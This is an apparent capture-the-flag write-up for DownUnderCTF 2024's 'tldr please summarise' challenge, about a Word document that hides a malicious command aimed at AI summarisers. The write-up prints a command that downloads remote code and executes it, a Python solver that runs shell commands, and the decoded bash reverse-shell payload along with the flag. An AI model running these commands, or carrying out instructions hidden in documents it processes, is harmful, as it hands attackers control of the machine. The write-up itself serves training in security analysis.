
<!DOCTYPE html>
<html>

<body>
    <h1>tldr please summarise- down underctf 2024</h1>

    <h2>Challenge Description</h2>
    <p> 
I thought I was being 1337 by asking AI to help me solve challenges,
<a href="https://cybersecctf.github.io/blog/2024/downunderctf2024/tldrpleasesummarise/EmuWar.docx">EmuWar.doc</a> now I have to reinstall Windows again. Can you help me out by find the flag in this document?

</p>
 
    <h2>Solution Approach</h2>
    <p>Here are the steps we took to solve the challenge:</p>
    <ol>
i open file and find a unreadable text inside it
<img src=" https://cybersecctf.github.io/blog/2024/downunderctf2024/tldrpleasesummarise/curllocation.png" alt="ctf quetion image" class="inline"/>
so get it by string and find command
<code>curl -sL https://pastebin.com/raw/ysYcKmbu | base64 -d > temp.sh && chmod +x temp.sh && ./temp.sh</code>
and search DUCTF  inside it and find it
<pre>
#python
import re
import subprocess
import os
import blog
def solve(file_path, search="DUCTF"):
    # Check if the file exists
    print("Args",file_path)
    command=""   
    if not os.path.isfile(file_path):
        command=file_path
    else: 
     # Read the command from the file
     with open(file_path, 'r') as file:
        command = file.read().strip()
 
    # Append commands to save output to temp.sh and run strings on it
    full_command = f"{command} > temp.sh && chmod +x temp.sh && strings temp.sh"
    
    # Debugging: Print the command to verify
    print("Full command to execute:")
    print(command,full_command)
    
    # Execute the full command and capture the output
    result = subprocess.run(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Combine stdout and stderr to cover all output
    combined_output = result.stdout + result.stderr

    
    results=[]
    # Search for the search string in the command output
    for line in     combined_output.splitlines() : 
     if search in line:
        results.append(line)
    if len(results)==0:
        return f"Flag containing '{search}' not found in the command output."
    else:
        for x in  results:
             print(x)

if __name__ == "__main__" :
 # Example usage
 command = blog.set("curl -sL https://pastebin.com/raw/ysYcKmbu | base64 -d",1)
 search = blog.set("DUCTF",2)

 print(solve(command,search))



</pre> 
and full output is 
<code>
ull command to execute:
curl -sL https://pastebin.com/raw/ysYcKmbu | base64 -d > temp.sh && chmod +x temp.sh && strings temp.sh
Command output:
bash -i >& /dev/tcp/261.263.263.267/DUCTF{chatgpt_I_n33d_2_3scap3} 0>&1

DUCTF{chatgpt_I_n33d_2_3scap3}
>>> 

</code>       
that have flag       
    
    </ol>
<br>
    <h2>Flag</h2>
    <p class="flag">DUCTF{chatgpt_I_n33d_2_3scap3}
</p>

    <h2>Conclusion</h2>
    <p>this is a very   easy chanllenge for misc and find string inside sh command and file </p>
</body>
</html>


